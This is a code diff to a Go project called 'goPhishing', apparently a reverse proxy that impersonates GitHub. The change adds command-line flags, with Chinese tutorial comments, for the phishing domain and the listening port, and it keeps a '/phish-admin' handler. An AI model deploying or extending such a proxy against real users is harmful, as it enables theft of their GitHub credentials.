@@ -2,6 +2,7 @@ package main
 
 import (
 	"bytes"
+	"flag"
 	"fmt"
 	"io/ioutil"
 	"log"
@@ -12,9 +13,11 @@ import (
 	"goPhishing/db"
 )
 
-const (
-	upstreamURL = "https://github.com"
-	phishURL    = "http://localhost:8080"
+const upstreamURL = "https://github.com"
+
+var (
+	phishURL string
+	port     string
 )
 
 // 用來 handler 所有 request
@@ -201,6 +204,15 @@ func adminHandler(w http.ResponseWriter, r *http.Request) {
 }
 
 func main() {
+	// 把 --phishURL=... 的值存進變數 phishURL 裡面
+	// 預設值是 "http://localhost:8080"
+	// "部署在哪個網域" 是這個參數的說明，自己看得懂就可以了
+	flag.StringVar(&phishURL, "phishURL", "http://localhost:8080", "部署在哪個網域")
+	// 把 --port=... 的值存進變數 port 裡面
+	// 預設值是 ":8080"
+	flag.StringVar(&port, "port", ":8080", "部署在哪個 port")
+	flag.Parse()
+
 	// 先連接到 DB
 	db.Connect()
 
@@ -208,5 +220,5 @@ func main() {
 	http.HandleFunc("/phish-admin", adminHandler)
 
 	http.HandleFunc("/", handler)
-	log.Fatal(http.ListenAndServe(":8080", nil))
+	log.Fatal(http.ListenAndServe(port, nil))
 }
